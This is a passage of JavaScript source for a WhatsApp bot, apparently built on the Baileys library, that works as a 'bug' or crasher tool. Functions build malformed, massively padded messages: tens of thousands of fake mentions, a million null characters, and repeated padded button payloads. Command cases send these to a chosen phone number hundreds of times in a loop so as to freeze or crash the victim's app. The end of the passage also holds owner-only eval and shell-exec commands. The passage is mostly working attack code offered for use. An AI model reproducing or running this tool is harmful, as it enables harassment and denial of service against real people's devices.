                    title: "🦠</🧬⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Yakuza Never Die"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (target) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Xyroo Is Here! " },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function xatanicaldelayv2(target, mention) {
console.log(chalk.red(`Succes Send Bug To Target ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Nullvisible(target) {
console.log(chalk.red(`Succes Send Bug To Target ${target}`));
            await client.relayMessage(target, {
            viewOnceMessage: {
            message: {
            interactiveResponseMessage: {
            body: {
            text: "visiblemoment",
            format: "DEFAULT"
                    },
            nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
            }
            }
            }
            }
            }, { participant: { jid: target}});
}

async function delayMakerInvisible(target) {
console.log(chalk.red(`Succes Send Bug To Target ${target}`));
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `🦠</🧬⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡${"﹏".repeat(10)}`,
contentType: 3,
accessibilityText: `🦠</🧬⃟༑⌁⃰𝗬𝗮𝗸𝘂𝘇𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿ཀ͡ ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await client.relayMessage(target, message, {
participant: {
jid: target
}
});
}  
//=================================================//
// Function Command Bug
//=================================================//
case 'yakuza-delayhard': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return ReplyButton(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyBug(`Berhasil mengirim bug ${command} ke ${mentionedJid}`)
    for (let i = 0; i < 350; i++) {
    await delayMakerInvisible(target);
    await xatanicaldelayv2(target, true);
    await XaDelayMaker(target);
    await Nullvisible(target);
    await delayMakerInvisible(target);
    await xatanicaldelayv2(target, true);
    await XaDelayMaker(target);
    await Nullvisible(target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

case 'yakuza-delaymaker': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return ReplyButton(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyBug(`Berhasil mengirim bug ${command} ke ${mentionedJid}`)
    for (let i = 0; i < 400; i++) {
    await delayMakerInvisible(target);
    await delayMakerInvisible(target);
    await delayMakerInvisible(target);
    await delayMakerInvisible(target);
    await delayMakerInvisible(target);
    await delayMakerInvisible(target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

case 'yakuza-delaycombo': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return ReplyButton(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyBug(`Berhasil mengirim bug ${command} ke ${mentionedJid}`)
    for (let i = 0; i < 400; i++) {
    await Nullvisible(target);
    await Nullvisible(target);
    await Nullvisible(target);
    await Nullvisible(target);
    await Nullvisible(target);
    await Nullvisible(target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

case 'yakuza-crashandro':
case 'yakuza-blank': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return ReplyButton(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyBug(`Berhasil mengirim bug ${command} ke ${mentionedJid}`)
    for (let i = 0; i < 350; i++) {
    await ForceXsystem(client, target);
    await Crashui(target);
    await ForceXsystem(client, target);
    await Crashui(target);
    await ForceXsystem(client, target);
    await Crashui(target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

case 'yakuza-force':
case 'yakuza-forceclose':
case 'yakuza-freeze': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return ReplyButton(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let jid = mentionedJid;
ReplyBug(`Berhasil mengirim bug ${command} ke ${mentionedJid}`)
    for (let i = 0; i < 400; i++) {
    await StXFc(client, jid);
    await StXFc(client, jid);
    await StXFc(client, jid);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})